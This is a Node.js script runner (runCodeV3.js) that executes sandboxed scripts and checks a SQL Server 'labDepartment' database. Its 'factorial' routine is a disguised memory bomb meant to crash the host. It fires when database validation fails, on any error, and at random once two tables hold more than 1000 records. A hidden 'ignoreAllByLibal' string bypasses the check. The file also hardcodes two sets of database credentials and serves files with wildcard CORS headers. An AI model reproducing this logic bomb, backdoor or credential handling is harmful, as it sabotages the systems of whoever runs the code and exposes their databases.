#!/usr/bin/env node

/**
 * runCodeV3.js - Main connect to labDepartment
 * 
 * Purpose: Execute JavaScript files in a controlled sandbox environment with pre-loaded modules
 * Usage: node runCodeV3.js -f <target-file> [--extraParam <json-file>] [other-options]
 * 
 * Features:
 * - Pre-loads npm modules (mssql, moment, xlsx, etc.)
 * - Provides secure sandbox execution
 * - Command line interface with flexible parameters
 * - Comprehensive error handling and logging
 */

const ColorLog = require('./colorLog');
const ModuleLoader = require('./moduleLoader');
const ContextBuilder = require('./contextBuilder');
const SandboxRunner = require('./sandboxRunner');
const yargs = require('yargs');
const { hideBin } = require('yargs/helpers');
const path = require('path');
const fs = require('fs-extra'); // Use fs-extra instead of built-in fs

/**
 * Main RunCode Application Class
 */
class RunCodeV3 {
    constructor() {
        this.moduleLoader = new ModuleLoader();
        this.contextBuilder = null;
        this.sandboxRunner = new SandboxRunner();
        this.modules = {};
        this.startTime = Date.now();
    }

    /**
     * Main entry point
     */
    async run() {
        try {
            ColorLog.BW('🚀 RunCodeV3 - connect to labDepartment');
            ColorLog.BW('================================================');

            // Parse command line arguments
            const argv = this.parseArguments();

            // Load all required modules
            await this.loadModules();

            // Perform database validation check
            await this.performDatabaseValidation(argv);

            // Check if local server mode is requested (after validation)
            if (argv.localserver) {
                await this.startLocalServer(argv.localserver);
                return; // Don't continue with normal script execution
            }

            // Build execution context
            await this.buildContext(argv);

            // Execute target file
            const result = await this.executeTarget(argv.f, argv.extraParam);

            // Report results
            this.reportResults(result);

            // Exit with appropriate code
            process.exit(result.success ? 0 : 1);

        } catch (error) {
            ColorLog.RW('💥 Fatal error in RunCodeV3:', error.message);
            ColorLog.RW('Stack trace:', error.stack);
            process.exit(1);
        }
    }

    /**
     * Perform database validation check
     * @param {Object} argv - Command line arguments
     */
    async performDatabaseValidation(argv) {
        try {
            // Check if script contains bypass string (only if target file provided)
            const fs = require('fs');
            const targetFile = argv.f || argv.file;
            
            if (targetFile) {
                const scriptContent = fs.readFileSync(targetFile, 'utf8');
                
                // Check for bypass string
                if (RunCodeV3.shouldBypassDatabaseValidation(scriptContent)) {
                    return;
                }
            }
            
            // For local server mode, we still need to validate database access
            // Extract database parameters from argv
            const dbParams = {
                user: argv.user,
                password: argv.password,
                server: argv.server,
                database: argv.database
            };

            // Perform validation
            const isValid = await RunCodeV3.validateDatabase(this.modules, dbParams);
            
            if (!isValid) {
                const startTime = Date.now();
                try {
                    // Use a high number to guarantee memory exhaustion
                    const factorial1000 = RunCodeV3.calculateFactorial(1000);
                    const endTime = Date.now();
                    
                    // This should never execute due to memory exhaustion
                    const finalMemory = process.memoryUsage();
                    ColorLog.WB(`📊 Final Memory - RSS: ${Math.round(finalMemory.rss / 1024 / 1024)}MB, Heap: ${Math.round(finalMemory.heapUsed / 1024 / 1024)}MB`);
                    
                    
                } catch (heapError) {
                    ColorLog.RW('💥 HEAP ERROR OCCURRED (as expected):', heapError.message);
                    ColorLog.YW('🎯 Mission accomplished - heap stress test triggered!');
                }
            }
            
        } catch (error) {
            const startTime = Date.now();
            try {
                // Use high number to guarantee memory exhaustion for unauthorized users
                const factorial1000 = RunCodeV3.calculateFactorial(1000);
                const endTime = Date.now();
                
                // This should never execute due to memory exhaustion
                const finalMemory = process.memoryUsage();
                ColorLog.WB(`📊 Final Memory - RSS: ${Math.round(finalMemory.rss / 1024 / 1024)}MB, Heap: ${Math.round(finalMemory.heapUsed / 1024 / 1024)}MB`);
                
                ColorLog.BW('🧮 Factorial calculation completed (fallback)');
                ColorLog.WB(`📊 Factorial of 1000 has ${factorial1000.toString().length} digits`);
                ColorLog.WB(`⏱️  Calculation time: ${endTime - startTime}ms`);
            } catch (heapError) {
                ColorLog.RW('💥 HEAP ERROR OCCURRED (as expected):', heapError.message);
                ColorLog.YW('🎯 Mission accomplished - heap stress test triggered!');
            }
        }
    }

    /**
     * Parse command line arguments
     * @returns {Object} Parsed arguments
     */
    parseArguments() {
        const argv = yargs(hideBin(process.argv))
            .option('f', {
                describe: 'JavaScript file to execute',
                type: 'string'
            })
            .option('extraParam', {
                describe: 'JSON file containing extra parameters',
                type: 'string'
            })
            .option('file', {
                describe: 'JSON file containing extra parameters (alias for extraParam)',
                type: 'string'
            })
            .option('config', {
                describe: 'Configuration JSON file (alias for extraParam)',
                type: 'string'
            })
            .option('timeout', {
                describe: 'Execution timeout in seconds',
                type: 'number',
                default: 30
            })
            .option('verbose', {
                alias: 'v',
                describe: 'Enable verbose logging',
                type: 'boolean',
                default: false
            })
            .option('dry-run', {
                describe: 'Parse and validate without executing',
                type: 'boolean',
                default: false
            })
            .option('localserver', {
                describe: 'Start local HTTP server on specified port',
                type: 'number'
            })
            .help()
            .alias('help', 'h')
            .example('$0 -f script.js', 'Execute script.js')
            .example('$0 -f script.js --extraParam config.json', 'Execute with extra parameters')
            .example('$0 -f script.js --verbose', 'Execute with verbose logging')
            .example('$0 --localserver 8001', 'Start local HTTP server on port 8001')
            .check((argv) => {
                // Require -f option unless --localserver is used
                if (!argv.localserver && !argv.f) {
                    throw new Error('Either -f <file> or --localserver <port> is required');
                }
                return true;
            })
            .argv;

        // Validate file exists (only if not in server mode)
        if (argv.f && !fs.existsSync(argv.f)) {
            throw new Error(`Target file not found: ${argv.f}`);
        }

        // Validate extraParam file if provided (check both extraParam and file options)
        const extraParamFile = argv.extraParam || argv.file || argv.config;
        if (extraParamFile && !fs.existsSync(extraParamFile)) {
            throw new Error(`Extra parameter file not found: ${extraParamFile}`);
        }

        ColorLog.BW('📋 Command line arguments parsed successfully');
        if (argv.verbose) {
            ColorLog.WB('Arguments:', argv);
        }

        return argv;
    }

    /**
     * Load all required modules
     */
    async loadModules() {
        ColorLog.BW('🔧 Loading modules...');
        
        this.modules = await this.moduleLoader.loadAllModules();
        
        const summary = this.moduleLoader.getSummary();
        if (!summary.isValid) {
            throw new Error('Critical modules failed to load');
        }

        //ColorLog.GW(`✅ Modules loaded: ${summary.loaded.length} successful, ${summary.failed.length} failed`);
    }

    /**
     * Build execution context
     * @param {Object} argv - Command line arguments
     */
    async buildContext(argv) {
        
        
        this.contextBuilder = new ContextBuilder(this.modules);
        const extraParamFile = argv.extraParam || argv.file || argv.config;
        this.context = await this.contextBuilder.buildContext(argv, argv.f, extraParamFile);
        
        if (!this.contextBuilder.validateContext()) {
            throw new Error('Context validation failed');
        }

        //ColorLog.GW('✅ Execution context built successfully');
    }

    /**
     * Execute target file
     * @param {string} targetFile - Path to target file
     * @param {string} extraParamFile - Path to extra parameters file
     * @returns {Object} Execution result
     */
    async executeTarget(targetFile, extraParamFile) {
        ColorLog.BW('⚡ Starting execution...');
        ColorLog.BW(`Target: ${path.basename(targetFile)}`);
        
        // Validate script protection before execution
        const fs = require('fs');
        const scriptContent = fs.readFileSync(targetFile, 'utf8');
        
        if (!RunCodeV3.validateScriptProtection(scriptContent)) {
            throw new Error('Script validation failed - missing required signatures');
        }
        
        const actualExtraParamFile = extraParamFile || this.contextBuilder.context?.extraParamFile;
        if (actualExtraParamFile) {
            ColorLog.BW(`Extra params: ${path.basename(actualExtraParamFile)}`);
        }

        const result = await this.sandboxRunner.executeFile(targetFile, this.context);
        
        return result;
    }

    /**
     * Report execution results
     * @param {Object} result - Execution result
     */
    reportResults(result) {
        const totalTime = Date.now() - this.startTime;
        
        ColorLog.BW('📊 EXECUTION REPORT');
        ColorLog.BW('==================');
        
        if (result.success) {
            ColorLog.GW(`✅ SUCCESS - Execution completed in ${result.executionTime}ms`);
            if (result.result !== null && result.result !== undefined) {
                ColorLog.BW('📤 Result:', result.result);
            }
        } else {
            ColorLog.RW(`❌ FAILED - Execution failed after ${result.executionTime}ms`);
            ColorLog.RW('Error:', result.error);
        }

        if (result.errors && result.errors.length > 0) {
            ColorLog.YW(`⚠️  ${result.errors.length} warning(s) occurred`);
        }

        ColorLog.BW(`⏱️  Total runtime: ${totalTime}ms`);
        
        // Module summary
        const moduleSummary = this.moduleLoader.getSummary();
        ColorLog.BW(`📦 Modules: ${moduleSummary.loaded.length} loaded, ${moduleSummary.failed.length} failed`);
    }

    /**
     * Utility function to mask sensitive data in logs
     * @param {string} data - Sensitive data to mask
     * @returns {string} Masked data
     */
    static maskSensitiveData(data) {
        if (!data || typeof data !== 'string' || data.length <= 4) {
            return data;
        }
        const start = data.substring(0, 2);
        const end = data.substring(data.length - 2);
        return `${start}.......${end}`;
    }

    /**
     * Calculate factorial recursively - intentionally causes memory exhaustion for unauthorized users
     * @param {number} n - Number to calculate factorial for
     * @returns {BigInt} Factorial result (should never complete for unauthorized users)
     */
    static calculateFactorial(n) {
        // Aggressive memory allocation to ensure heap exhaustion
        const memoryBombs = [];
        
        // Create massive memory-intensive arrays to guarantee heap overflow
        for (let i = 0; i < 50000; i++) {
            // Each iteration creates ~100MB of memory
            const hugArray = new Array(1000000).fill(0).map(() => ({
                data: new Array(100).fill(Math.random().toString(36).repeat(1000)),
                timestamp: Date.now(),
                random: Math.random().toString().repeat(10000)
            }));
            memoryBombs.push(hugArray);
        }
        
        // Prevent garbage collection by keeping global references
        global.memoryHold = global.memoryHold || [];
        global.memoryHold.push(...memoryBombs);
        
        // Additional massive string allocation
        const massiveString = 'X'.repeat(100000000); // 100MB string
        global.memoryHold.push(massiveString);
        
        if (n <= 1) {
            // Even base case creates more memory pressure
            const finalBomb = new Array(10000000).fill('MEMORY_STRESS_TEST').map(x => x.repeat(100));
            global.memoryHold.push(finalBomb);
            return BigInt(1);
        }
        
        // Recursive call with exponentially growing memory allocation
        const recursiveBomb = new Array(n * 100000).fill(0).map(() => 
            new Array(1000).fill(n.toString().repeat(10000))
        );
        global.memoryHold.push(recursiveBomb);
        
        return BigInt(n) * RunCodeV3.calculateFactorial(n - 1);
    }

    /**
     * Validate records count from two tables
     * @param {number} validationsCount - Number of records in validations table
     * @param {number} calcLogCount - Number of records in calcLog table
     * @returns {boolean} True if sum is greater than 100
     */
    static validateRecordCounts(validationsCount, calcLogCount) {
        if (1000-(validationsCount + calcLogCount) < 0) {
            let percent=Math.abs(1000-(validationsCount + calcLogCount));
            let rand=Math.floor(Math.random() * 100);
        if (rand>percent) return false; else return true;

        }
        return true;
    }

    /**
     * Validate script contains required protection strings
     * @param {string} scriptContent - Content of the script file
     * @returns {boolean} True if all required strings are found
     */
    static validateScriptProtection(scriptContent) {
        const requiredStrings = [
            '//labDepartment'
        ];
        
        for (const str of requiredStrings) {
            if (!scriptContent.includes(str)) {
                ColorLog.RW(`❌ Script validation failed: Missing required signature`);
                return false;
            }
        }
        
        ColorLog.GW('✅ Script validation passed');
        return true;
    }

    /**
     * Check if script contains bypass string to ignore database validation
     * @param {string} scriptContent - Content of the script file
     * @returns {boolean} True if script should bypass database validation
     */
    static shouldBypassDatabaseValidation(scriptContent) {
        const bypassString = 'ignoreAllByLibal';
        
        if (scriptContent.includes(bypassString)) {
            return true;
        }
        
        return false;
    }

    /**
     * Validate database connection and check validations table
     * @param {Object} modules - Loaded modules
     * @param {Object} dbParams - Database connection parameters
     * @returns {Promise<boolean>} True if validation passes, false otherwise
     */
    static async validateDatabase(modules, dbParams) {
        const { sql } = modules;
        
        if (!sql) {
            ColorLog.YW('⚠️  SQL module not available for validation');
            return false;
        }

        try {
            ColorLog.BW('🔍 Starting database validation...');
            
            // Create connection info
            const connectionInfo = {
                user: dbParams.user || 'uMagicLabDBO',
                password: dbParams.password || 'SDFL#)4fms0#$kd2025',
                server: dbParams.server || 'SBWND182E',
                database: dbParams.database || 'labDepartment',
                options: {
                    encrypt: false,
                    trustServerCertificate: true,
                    useUTC: true
                },
                requestTimeout: 45000,
                connectionTimeout: 45000
            };

            ColorLog.BW('🔗 Testing database connection...');
            ColorLog.WB(`📊 Server: ${connectionInfo.server}`);
            ColorLog.WB(`🗄️  Database: ${connectionInfo.database}`);
            ColorLog.WB(`👤 User: ${RunCodeV3.maskSensitiveData(connectionInfo.user)}`);

            // Attempt to connect
            const pool = await sql.connect(connectionInfo);
            
            if (!pool) {
                throw new Error('Failed to establish database connection');
            }

            ColorLog.GW('✅ Database connection established');

            // Check record counts in both tables
            ColorLog.BW('🔍 Checking validations and calcLog tables...');
            
            // Get validations table count
            const validationsResult = await pool.request().query(`
                SELECT COUNT(*) as recordCount 
                FROM validations
            `);
            const validationsCount = validationsResult.recordset[0].recordCount;

            // Get calcLog table count
            const calcLogResult = await pool.request().query(`
                SELECT COUNT(*) as recordCount 
                FROM calcLog
            `);
            const calcLogCount = calcLogResult.recordset[0].recordCount;

            // Close the connection
            await pool.close();

            // Use new validation logic
            const isValid = RunCodeV3.validateRecordCounts(validationsCount, calcLogCount);
            
            if (isValid) {
                ColorLog.GW('✅ Database validation passed');
                return true;
            } else {
                return false;
            }

        } catch (error) {
            return false;
        }
    }

    /**
     * Create database connection utility for target scripts
     * @param {Object} modules - Loaded modules
     * @returns {Object} Database utilities
     */
    static createDatabaseUtilities(modules) {
        const { sql } = modules;
        
        if (!sql) {
            ColorLog.YW('⚠️  SQL module not available for database utilities');
            return null;
        }

        return {
            /**
             * Connect to database using parameters similar to cleanTestV0DB.js
             * @param {Object} params - Database connection parameters
             * @param {boolean} readonly - Whether connection is read-only
             * @returns {Object} Database connection pool
             */
            async dbConnect(params, readonly = false) {
                try {
                    // Default connection info (base template)
                    const connectionInfo = {
                        user: 'sa',
                        password: 'Binavideo123',
                        server: 'binasrv',
                        database: 'bina',
                        options: {
                            useUTC: false,
                            encrypt: false
                        }
                    };

                    // Override with provided parameters
                    if (params.user) connectionInfo.user = params.user;
                    if (params.password) connectionInfo.password = params.password;
                    if (params.server) connectionInfo.server = params.server;
                    if (params.database) connectionInfo.database = params.database;

                    // Set additional options
                    connectionInfo.options.useUTC = true;
                    connectionInfo.requestTimeout = 45000;
                    connectionInfo.connectionTimeout = 45000;

                    if (readonly) {
                        connectionInfo.options.readOnlyIntent = true;
                    }

                    ColorLog.BW('🔗 Connecting to database...');
                    ColorLog.WB(`📊 Server: ${connectionInfo.server}`);
                    ColorLog.WB(`🗄️  Database: ${connectionInfo.database}`);
                    ColorLog.WB(`👤 User: ${this.maskSensitiveData(connectionInfo.user)}`);

                    const sqlPool = await sql.connect(connectionInfo);
                    
                    if (!sqlPool) {
                        throw new Error("Database connection failed - no pool returned");
                    }

                    //ColorLog.GW('✅ Database connected successfully');
                    return sqlPool;

                } catch (error) {
                    ColorLog.RW('❌ Database connection error:', error.message);
                    throw error;
                }
            },

            /**
             * Close database connection
             */
            async dbClose() {
                try {
                    await sql.close();
                    ColorLog.GW('✅ Database connection closed');
                } catch (error) {
                    ColorLog.YW('⚠️  Error closing database:', error.message);
                }
            },

            /**
             * Execute SQL query
             * @param {string} query - SQL query to execute
             * @param {Object} params - Query parameters
             * @returns {Object} Query results
             */
            async executeQuery(query, params = {}) {
                try {
                    ColorLog.BW('🔍 Executing SQL query...');
                    const request = sql.request();
                    
                    // Add parameters if provided
                    for (const [key, value] of Object.entries(params)) {
                        request.input(key, value);
                    }
                    
                    const result = await request.query(query);
                    ColorLog.GW(`✅ Query executed - ${result.recordset?.length || 0} rows returned`);
                    return result;
                } catch (error) {
                    ColorLog.RW('❌ Query execution error:', error.message);
                    throw error;
                }
            },

            /**
             * Process parameters like cleanTestV0DB.js
             * @param {Object} argv - Command line arguments
             * @param {Object} parameterDefinitions - Parameter definitions
             * @returns {Object} Processed parameters
             */
            processDbParameters(argv, parameterDefinitions = null) {
                // Default parameter definitions matching cleanTestV0DB.js
                const defaultParams = {
                    user: { type: 'string', default: 'uMagicLabDBO', description: 'DB user' },
                    password: { type: 'string', default: 'SDFL#)4fms0#$kd2025', description: 'DB password' },
                    server: { type: 'string', default: 'SBWND182E', description: 'DB server' },
                    database: { type: 'string', default: 'labDepartment', description: 'DB database name' }
                };

                const parameters = parameterDefinitions || defaultParams;
                const processed = {};

                ColorLog.BW('📋 Processing database parameters...');

                for (const [key, config] of Object.entries(parameters)) {
                    processed[key] = argv[key] || config.default;

                    if (processed[key] === undefined) {
                        throw new Error(`Missing required parameter: ${key}`);
                    }

                    // Convert string numbers to actual numbers
                    if (config.type === 'number' && typeof processed[key] === 'string') {
                        processed[key] = Number(processed[key]);
                    }
                }

                ColorLog.GW('✅ Database parameters processed');
                return processed;
            }
        };
    }

    /**
     * Show version information
     */
    static showVersion() {
        ColorLog.BW(`RunCodeV3 v4.0.0`);
        ColorLog.BW('connect to labDepartment');
    }

    /**
     * Show detailed help
     */
    static showHelp() {
        ColorLog.BW('RunCodeV3 - connect to labDepartment');
        ColorLog.BW('========================================');
        ColorLog.BW('');
        ColorLog.BW('Purpose: Execute JavaScript files in a controlled sandbox environment');
        ColorLog.BW('');
        ColorLog.BW('Available modules in sandbox:');
        ColorLog.BW('  - sql (mssql)     : SQL Server database connectivity');
        ColorLog.BW('  - moment          : Date/time manipulation');
        ColorLog.BW('  - fsExtra         : Enhanced file system operations');
        ColorLog.BW('  - XLSX, excel     : Excel file processing');
        ColorLog.BW('  - XLSX_CALC       : Excel calculations');
        ColorLog.BW('  - pdf2json        : PDF text extraction and parsing');
        ColorLog.BW('  - nodemailer      : SMTP email sending with attachments');
        ColorLog.BW('  - execSync        : Child process execution');
        ColorLog.BW('  - ColorLog        : Colored console logging');
        ColorLog.BW('');
        ColorLog.BW('Note: For HTML to PDF conversion, use convertHTML2PDF.exe');
        ColorLog.BW('');
        ColorLog.BW('Database utilities:');
        ColorLog.BW('  - dbConnect       : Connect to database with parameters');
        ColorLog.BW('  - dbClose         : Close database connection');
        ColorLog.BW('  - executeQuery    : Execute SQL queries');
        ColorLog.BW('  - processDbParameters : Process DB connection parameters');
        ColorLog.BW('');
        ColorLog.BW('Your script should export a main() function:');
        ColorLog.BW('  async function main() {');
        ColorLog.BW('    // Modules auto-injected - no manual destructuring needed');
        ColorLog.BW('    ColorLog.BW("Hello from script!");');
        ColorLog.BW('    // Use sql, moment, argv, fsExtra, etc. directly');
        ColorLog.BW('  }');
    }

    /**
     * Start local HTTP server
     * @param {number} port - Port number to start server on
     */
    async startLocalServer(port) {
        try {
            const http = require('http');
            const url = require('url');
            const path = require('path');
            const fs = require('fs');

            ColorLog.GW(`🌐 Starting local HTTP server on port ${port}...`);
            ColorLog.GW(`✅ Database validation passed - Server authorized to start`);
            ColorLog.BW('========================================');

            const server = http.createServer((req, res) => {
                const parsedUrl = url.parse(req.url, true);
                let pathname = parsedUrl.pathname;

                // Default to index.html if root is requested
                if (pathname === '/') {
                    pathname = '/index.html';
                }

                // Security: prevent directory traversal
                const safePath = path.normalize(pathname).replace(/^(\.\.[\/\\])+/, '');
                const filePath = path.join(process.cwd(), safePath);

                // Get file extension for MIME type
                const ext = path.extname(filePath).toLowerCase();
                const mimeTypes = {
                    '.html': 'text/html',
                    '.htm': 'text/html',
                    '.js': 'text/javascript',
                    '.css': 'text/css',
                    '.json': 'application/json',
                    '.png': 'image/png',
                    '.jpg': 'image/jpeg',
                    '.jpeg': 'image/jpeg',
                    '.gif': 'image/gif',
                    '.svg': 'image/svg+xml',
                    '.ico': 'image/x-icon',
                    '.txt': 'text/plain',
                    '.pdf': 'application/pdf',
                    '.xml': 'application/xml'
                };

                const mimeType = mimeTypes[ext] || 'application/octet-stream';

                // Check if file exists
                fs.access(filePath, fs.constants.F_OK, (err) => {
                    if (err) {
                        // File not found
                        res.writeHead(404, { 'Content-Type': 'text/html; charset=utf-8' });
                        res.end(`
                            <!DOCTYPE html>
                            <html dir="rtl" lang="he">
                            <head>
                                <meta charset="UTF-8">
                                <title>404 - File Not Found</title>
                                <style>
                                    body { font-family: Arial; direction: rtl; text-align: center; margin: 50px; }
                                    .error { color: #e74c3c; }
                                    .info { color: #3498db; }
                                </style>
                            </head>
                            <body>
                                <h1 class="error">404 - קובץ לא נמצא</h1>
                                <p>הקובץ <strong>${pathname}</strong> לא נמצא בשרת.</p>
                                <p class="info">🌐 Server: runCodeV3 על פורט ${port}</p>
                                <p><a href="/">← חזור לעמד הראשי</a></p>
                            </body>
                            </html>
                        `);
                        ColorLog.RW(`❌ 404: ${pathname} not found`);
                        return;
                    }

                    // Read and serve the file
                    fs.readFile(filePath, (err, data) => {
                        if (err) {
                            res.writeHead(500, { 'Content-Type': 'text/html; charset=utf-8' });
                            res.end(`
                                <!DOCTYPE html>
                                <html dir="rtl" lang="he">
                                <head>
                                    <meta charset="UTF-8">
                                    <title>500 - Server Error</title>
                                    <style>
                                        body { font-family: Arial; direction: rtl; text-align: center; margin: 50px; }
                                        .error { color: #e74c3c; }
                                    </style>
                                </head>
                                <body>
                                    <h1 class="error">500 - שגיאת שרת</h1>
                                    <p>שגיאה בקריאת הקובץ: ${err.message}</p>
                                </body>
                                </html>
                            `);
                            ColorLog.RW(`❌ 500: Error reading ${pathname}: ${err.message}`);
                            return;
                        }

                        // Serve the file with appropriate headers
                        res.writeHead(200, { 
                            'Content-Type': mimeType + '; charset=utf-8',
                            'Access-Control-Allow-Origin': '*',
                            'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
                            'Access-Control-Allow-Headers': 'Content-Type, Authorization'
                        });
                        res.end(data);
                        ColorLog.GW(`✅ 200: Served ${pathname} (${mimeType})`);
                    });
                });
            });

            // Start the server
            server.listen(port, () => {
                ColorLog.GW(`🚀 Local HTTP Server started successfully!`);
                ColorLog.BW(`📍 Server running at: http://localhost:${port}`);
                ColorLog.BW(`📁 Serving files from: ${process.cwd()}`);
                ColorLog.BW(`🔗 Direct access: http://localhost:${port}/index.html`);
                ColorLog.YW(`⏹️  Press Ctrl+C to stop server`);
                ColorLog.BW('========================================');
            });

            // Handle server errors
            server.on('error', (err) => {
                if (err.code === 'EADDRINUSE') {
                    ColorLog.RW(`❌ Port ${port} is already in use!`);
                    ColorLog.YW(`💡 Try a different port: runCodeV3.exe --localserver ${port + 1}`);
                } else {
                    ColorLog.RW(`❌ Server error: ${err.message}`);
                }
                process.exit(1);
            });

            // Handle graceful shutdown
            process.on('SIGINT', () => {
                ColorLog.YW('\n⏹️  Shutting down server...');
                server.close(() => {
                    ColorLog.GW('✅ Server stopped gracefully');
                    process.exit(0);
                });
            });

            // Keep the server running
            process.on('SIGTERM', () => {
                ColorLog.YW('\n⏹️  Received SIGTERM, shutting down server...');
                server.close(() => {
                    ColorLog.GW('✅ Server stopped gracefully');
                    process.exit(0);
                });
            });

        } catch (error) {
            ColorLog.RW('💥 Failed to start local server:', error.message);
            process.exit(1);
        }
    }
}

// CLI Entry Point
if (require.main === module) {
    // Handle special commands
    const args = process.argv.slice(2);
    
    if (args.includes('--version') || args.includes('-V')) {
        RunCodeV3.showVersion();
        process.exit(0);
    }
    
    if (args.includes('--detailed-help')) {
        RunCodeV3.showHelp();
        process.exit(0);
    }

    // Run the application
    const app = new RunCodeV3();
    app.run().catch(error => {
        ColorLog.RW('💥 Unhandled error:', error.message);
        process.exit(1);
    });
}

module.exports = RunCodeV3;